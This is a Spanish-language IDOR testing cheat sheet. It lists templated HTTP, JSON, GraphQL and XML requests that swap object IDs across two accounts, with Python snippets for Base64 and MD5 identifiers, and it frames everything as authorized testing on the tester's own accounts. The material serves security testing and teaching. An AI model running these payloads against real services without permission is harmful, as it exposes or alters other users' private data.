# 🗡️ IDOR: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### ID en ruta y consulta

```text
GET /api/users/{ID_A}
GET /api/users/{ID_B}
GET /api/orders/{PEDIDO_A}
GET /api/orders/{PEDIDO_B}
GET /api/documents?id={DOCUMENTO_A}
GET /api/documents?id={DOCUMENTO_B}
```

**Cuándo usarlo:** A y B son dos cuentas u objetos propios. Comparar respuesta, propietario y autorización; diferencias de estado de negocio no bastan.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control/idor).


### Nombres frecuentes de parámetro

```text
user_id={ID_B}
accountId={ID_B}
owner={ID_B}
document_id={DOCUMENTO_B}
orderId={PEDIDO_B}
tenant_id={TENANT_B}
```

**Cuándo usarlo:** Tras identificar un parámetro real, sustituir solo su valor por el de un objeto B propio. Un nombre agregado e ignorado no demuestra autorización rota.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).


## 🧭 Payloads por contexto

### IDs en cuerpo y anidación

```json
{"userId":"{ID_B}"}
{"ownerId":"{ID_B}","documentId":"{DOCUMENTO_A}"}
{"account":{"id":"{ID_B}"}}
{"items":[{"id":"{ITEM_A}"},{"id":"{ITEM_B}"}]}
```

**Cuándo usarlo:** Plantillas alternativas: enviar una por solicitud a operaciones existentes. Para lecturas y escrituras, corroborar propiedad del objeto y efecto con las dos cuentas propias.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).


### Identificadores opacos y codificados

```text
/api/users/{UUID_A}
/api/users/{UUID_B}
/api/users/{BASE64_DE_ID_A}
/api/users/{BASE64_DE_ID_B}
/api/users/{SLUG_A}
/api/users/{SLUG_B}
```

**Cuándo usarlo:** Obtener ambos identificadores desde tus cuentas. Que sean UUID o Base64 no sustituye autorización por objeto; evita enumerar IDs ajenos.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).


### Funciones laterales del mismo objeto

```text
GET /api/documents/{DOCUMENTO_B}
GET /api/documents/{DOCUMENTO_B}/download
GET /api/documents/{DOCUMENTO_B}/preview
GET /api/documents/{DOCUMENTO_B}/history
GET /api/documents/{DOCUMENTO_B}/metadata
```

**Cuándo usarlo:** Aplicar a un objeto B propio si el producto ofrece estas funciones. La política debe ser consistente en descarga, vista previa, historial y metadatos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/access-control/idor).


## 🔥 Payloads avanzados

### GraphQL y lote de objetos

```graphql
query { node(id:"{GID_A}") { id } }
query { node(id:"{GID_B}") { id } }
query { a:node(id:"{GID_A}") { id } b:node(id:"{GID_B}") { id } }
query { documents(ids:["{DOCUMENTO_A}","{DOCUMENTO_B}"]) { id ownerId } }
```

**Cuándo usarlo:** Adaptar al esquema real y usar GID/IDs obtenidos legítimamente. Confirmar si el nodo B devuelve datos privados de B bajo sesión A.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).


### Duplicación de parámetro y formatos

```text
GET /api/documents?id={DOCUMENTO_A}&id={DOCUMENTO_B}
GET /api/documents?id={DOCUMENTO_B}&id={DOCUMENTO_A}
POST /api/documents/read  {"id":"{DOCUMENTO_B}"}
POST /api/documents/read  id={DOCUMENTO_B}
```

**Cuándo usarlo:** Probar una variante por solicitud, solo si el endpoint admite esos formatos. La discrepancia entre capa de autorización y capa de datos debe demostrarse con objeto B propio.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).


## 🔬 Pruebas guiadas por escenario

### 1. ID en segmento de ruta

**Objetivo:** Con cuentas A y B propias, leer desde A el objeto creado por B.

```http
GET /api/objects/{ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar con lectura autorizada de B y con ID inexistente. Confirmar datos privados de B, no solo 200.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 2. ID en query string

**Objetivo:** Cambiar solo el identificador de una URL observada en el tráfico real.

```http
GET /api/invoices?invoice_id={FACTURA_PROPIA_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Una factura de B devuelta a A confirma fallo horizontal; registrar identificadores redactados.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control/idor).

### 3. ID en cuerpo JSON

**Objetivo:** Consultar un resumen de objeto de B cambiando el objectId del cuerpo bajo sesión A.

```http
POST /api/objects/summary HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"objectId":"{ID_OBJETO_B}"}
```

**Interpretación:** Usar únicamente un endpoint de lectura existente; el body no deja de requerir autorización por objeto.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 4. Hijo de otro padre

**Objetivo:** Cruzar parentId y childId de dos estructuras propias para probar la relación entre ambos.

```http
GET /api/projects/{PROYECTO_A}/files/{ARCHIVO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** El archivo B debe rechazarse aunque el proyecto A sea accesible. Una política solo sobre el padre es insuficiente.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 5. Archivo estático por identificador

**Objetivo:** Pedir con A un archivo privado generado por B usando el nombre exacto conocido en el laboratorio.

```http
GET /static/exports/{ARCHIVO_PRIVADO_B}.txt HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
```

**Interpretación:** Confirmar contenido propio de B. Un nombre no adivinable reduce descubrimiento, pero no establece autorización.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/access-control/idor).

### 6. ID codificado en Base64

**Objetivo:** Si la app codifica un correo o ID, sustituirlo por la codificación de una cuenta propia B.

```python
import base64
print(base64.urlsafe_b64encode(b"{EMAIL_PROPIO_B}").decode().rstrip("="))
```

**Interpretación:** Usar el valor en el parámetro real y comparar sesión A/B; codificar un ID no es un control de acceso.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 7. ID derivado de hash

**Objetivo:** Solo si el producto usa una transformación conocida, calcular el identificador de la cuenta propia B.

```python
import hashlib
print(hashlib.md5(b"{EMAIL_PROPIO_B}").hexdigest())
```

**Interpretación:** No asumir MD5: comprobar algoritmo y normalización observados. El hash dificulta adivinar, pero la autorización sigue obligatoria.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 8. Lista mixta de objetos

**Objetivo:** Pedir una lista que contiene un objeto propio de A y otro creado por B.

```http
POST /api/objects/batch-read HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"ids":["{ID_OBJETO_A}","{ID_OBJETO_B}"]}
```

**Interpretación:** Aplicar la política a cada elemento. El retorno de A no justifica incluir B; adaptar a un endpoint batch existente.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 9. Exportación por ID

**Objetivo:** Verificar si la ruta de exportación protege igual que la vista de un documento propio de B.

```http
GET /api/reports/{REPORTE_B}/export HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Si la vista rechaza y export entrega bytes de B, documentar ambos controles. No descargar datos ajenos.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 10. Método alternativo de lectura

**Objetivo:** Cuando el producto ofrece POST y GET equivalentes, repetir la lectura de B con el método alternativo.

```http
POST /api/objects/{ID_OBJETO_B}/view HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{}
```

**Interpretación:** Adaptar a una operación documentada o vista en tráfico; una ruta inventada con 404 no aporta señal.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 11. Contaminación de parámetro ID

**Objetivo:** Evaluar qué valor elige el backend cuando el mismo parámetro aparece dos veces.

```http
GET /api/objects?object_id={ID_OBJETO_A}&object_id={ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Comparar ambos órdenes y observar cuál objeto se devuelve. Solo es IDOR si A recibe datos privados de B.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 12. Nodo GraphQL con ID global

**Objetivo:** Consultar bajo A el node ID conocido de un objeto propio de B.

```graphql
query ObjetoDeB { node(id: "{GLOBAL_ID_OBJETO_B}") { id ... on Document { title } } }
```

**Interpretación:** Se aplica si el esquema expone node o un resolver equivalente; el ID global/Base64 no reemplaza autorización.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 13. Edición cruzada reversible

**Objetivo:** Desde A, cambiar temporalmente el título de un objeto descartable de la cuenta propia B.

```http
PATCH /api/objects/{ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"title":"marca-{NONCE}"}
```

**Interpretación:** B debe comprobar persistencia y restaurar el título; el cambio real demuestra IDOR de escritura.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/).

### 14. ID como array

**Objetivo:** En un endpoint existente que espera un ID escalar, probar un array con un ID propio de B.

```json
{"id":["{ID_OBJETO_B}"]}
```

**Interpretación:** Puede ser rechazo, coerción al primer elemento o lista; solo es IDOR si A recibe o modifica el objeto de B.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 15. Mismo objeto con XML

**Objetivo:** Si el endpoint acepta JSON y XML, comparar autorización del objectId B en ambos deserializadores.

```xml
<request><objectId>{ID_OBJETO_B}</objectId></request>
```

**Interpretación:** Se requiere una operación equivalente observada en la aplicación; una respuesta XML distinta no demuestra acceso a B.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md).

### 16. Mutación GraphQL de objeto ajeno

**Objetivo:** Con dos cuentas propias, pedir desde A un cambio reversible sobre el objeto creado por B.

```graphql
mutation EditarB { updateDocument(id: "{ID_DOCUMENTO_B}", title: "marca-{NONCE}") { id title } }
```

**Interpretación:** Comprobar con B el efecto y revertirlo; el resolver debe autorizar el objeto, aunque el ID global sea opaco.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
